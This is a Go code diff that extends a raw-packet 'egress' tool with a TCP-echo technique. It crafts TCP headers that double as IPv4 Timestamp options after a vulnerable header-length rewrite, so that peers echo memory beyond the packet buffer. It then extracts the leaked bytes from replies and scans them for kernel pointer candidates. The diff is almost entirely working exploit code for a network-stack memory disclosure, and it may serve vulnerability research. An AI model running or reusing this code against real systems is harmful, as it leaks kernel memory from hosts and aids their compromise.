@@ -29,6 +29,7 @@ const (
 	ethPArp        = 0x0806
 	ethPExperiment = 0x88b5
 	egressSprayLen = 128
+	tcpEchoSrcPort = 0x8804
 )
 
 type egressRoute struct {
@@ -49,6 +50,7 @@ type egressCaptureStats struct {
 	matchedPackets  int
 	matchedIDs      map[uint16]struct{}
 	returnedPackets int
+	tcpEchoReplies  int
 	arpRequests     int
 	arpReplies      int
 }
@@ -120,10 +122,14 @@ func runEgress(c cfg) error {
 	if c.tcpValid {
 		adjustIP = -1
 	}
-	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x\n",
+	tcpSrcPort := uint16(c.tcpSrcPort)
+	if c.tcpEcho {
+		tcpSrcPort = tcpEchoSrcPort
+	}
+	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x tcp_echo=%t\n",
 		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
 		routeIPv4(route.dest), route.prefix, c.transport, payloadLen, fragments,
-		c.egressSpray, c.egressFill)
+		c.egressSpray, c.egressFill, c.tcpEcho)
 
 	samples := make([]egressPrepared, 0, c.count)
 	expected := make(map[uint16]struct{}, c.count)
@@ -137,7 +143,10 @@ func runEgress(c cfg) error {
 		case "udp":
 			egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
 		case "tcp":
-			egressTCPHeaders(payload, uint16(c.tcpSrcPort), uint16(c.tcpPort))
+			egressTCPHeaders(payload, tcpSrcPort, uint16(c.tcpPort))
+			if c.tcpEcho {
+				egressTCPEchoOptions(payload)
+			}
 		default:
 			for i := 0; i < c.head; i++ {
 				payload[i] = marker
@@ -161,12 +170,12 @@ func runEgress(c cfg) error {
 			return fmt.Errorf("sample %d: %w", sample, err)
 		}
 	}
-	stats, err := egressCollectICMP(rx, tx, ifi, c.egressWait, expected, dst, proto, c.head, c.answerDstARP)
+	stats, err := egressCollectICMP(rx, tx, ifi, c.egressWait, expected, src, dst, proto, c.head, c.answerDstARP, c.tcpEcho, tcpSrcPort, uint16(c.tcpPort))
 	if err != nil {
 		return fmt.Errorf("capture: %w", err)
 	}
-	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d arp_requests=%d arp_replies=%d icmp=%d quoted_tcp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
-		len(samples), stats.txFragments, stats.returnedPackets, stats.arpRequests, stats.arpReplies,
+	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d tcp_echo_replies=%d arp_requests=%d arp_replies=%d icmp=%d quoted_tcp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
+		len(samples), stats.txFragments, stats.returnedPackets, stats.tcpEchoReplies, stats.arpRequests, stats.arpReplies,
 		stats.icmpPackets, stats.quotedTCP, stats.quotedUDP, stats.quoted253,
 		stats.matchedPackets, len(stats.matchedIDs))
 	if !stats.matched {
@@ -203,6 +212,24 @@ func egressTCPHeaders(payload []byte, srcPort, dstPort uint16) {
 	// transport header observed on the emitted fragments.
 	putTCPHeader(payload[:20], srcPort, dstPort)
 	putTCPHeader(payload[40:60], srcPort, dstPort)
+}
+
+// egressTCPEchoOptions makes the original TCP header double as a valid
+// 40-byte IPv4 option area after the vulnerable IHL rewrite. Source port
+// 0x8804 is a copied four-byte Stream-ID option; it safely consumes the
+// destination port. The sequence bytes then describe a 36-byte Timestamp
+// option whose pointer is one byte beyond the option, so a peer copies it into
+// a reply without replacing any disclosed bytes. The same sequence is used in
+// the post-mutation TCP header to keep conntrack state consistent.
+func egressTCPEchoOptions(payload []byte) {
+	if len(payload) < 60 {
+		return
+	}
+	payload[4] = 0x44 // IPOPT_TIMESTAMP
+	payload[5] = 36
+	payload[6] = 37 // no free route slot
+	payload[7] = 0  // TSONLY; routers may increment only the overflow nibble
+	copy(payload[44:48], payload[4:8])
 }
 
 func putTCPHeader(dst []byte, srcPort, dstPort uint16) {
@@ -582,7 +609,7 @@ func egressFrame(ip []byte, src, dst net.HardwareAddr, tags int) []byte {
 	return f
 }
 
-func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, expected map[uint16]struct{}, dst net.IP, proto byte, head int, answerDstARP bool) (egressCaptureStats, error) {
+func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, expected map[uint16]struct{}, src, dst net.IP, proto byte, head int, answerDstARP, tcpEcho bool, tcpSrcPort, tcpDstPort uint16) (egressCaptureStats, error) {
 	deadline := time.Now().Add(wait)
 	buf := make([]byte, 65536)
 	stats := egressCaptureStats{matchedIDs: make(map[uint16]struct{})}
@@ -620,6 +647,17 @@ func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, exp
 			}
 		}
 		toLocalMAC := len(frame) >= ethLen && bytes.Equal(frame[0:6], ifi.HardwareAddr) && !bytes.Equal(frame[6:12], ifi.HardwareAddr)
+		if tcpEcho && toLocalMAC {
+			if leak, ok := egressTCPEchoLeak(outer, src, dst, tcpSrcPort, tcpDstPort); ok {
+				stats.matched = true
+				stats.matchedPackets++
+				stats.tcpEchoReplies++
+				fmt.Printf("tcp-option-echo: src=%s source_port=%d destination_port=%d leak_len=%d\n",
+					net.IP(outer[12:16]), tcpDstPort, tcpSrcPort, len(leak))
+				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
+				printKernelPointerCandidates("  ", leak)
+			}
+		}
 		if toLocalMAC && expectedID && net.IP(outer[16:20]).Equal(dst) && int(outer[0]&0x0f)*4 > ipLen {
 			stats.matched = true
 			stats.matchedPackets++
@@ -673,6 +711,43 @@ func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, exp
 		egressPrintOptions(quoted, head)
 	}
 	return stats, nil
+}
+
+func egressTCPEchoLeak(ip []byte, local, remote net.IP, localPort, remotePort uint16) ([]byte, bool) {
+	if len(ip) < ipLen || ip[0]>>4 != 4 || ip[9] != ipProtoTCP ||
+		!net.IP(ip[12:16]).Equal(remote) || !net.IP(ip[16:20]).Equal(local) {
+		return nil, false
+	}
+	ihl := int(ip[0]&0x0f) * 4
+	if ihl < ipLen || ihl > len(ip) || len(ip) < ihl+20 {
+		return nil, false
+	}
+	tcp := ip[ihl:]
+	if binary.BigEndian.Uint16(tcp[0:2]) != remotePort || binary.BigEndian.Uint16(tcp[2:4]) != localPort {
+		return nil, false
+	}
+	options := ip[ipLen:ihl]
+	for off := 0; off < len(options); {
+		switch options[off] {
+		case 0:
+			return nil, false
+		case 1:
+			off++
+			continue
+		}
+		if off+2 > len(options) {
+			return nil, false
+		}
+		optionLen := int(options[off+1])
+		if optionLen < 2 || off+optionLen > len(options) {
+			return nil, false
+		}
+		if options[off] == 0x44 && optionLen == 36 && options[off+2] == 37 {
+			return append([]byte(nil), options[off+4:off+optionLen]...), true
+		}
+		off += optionLen
+	}
+	return nil, false
 }
 
 func egressPrintOptions(ip []byte, head int) {
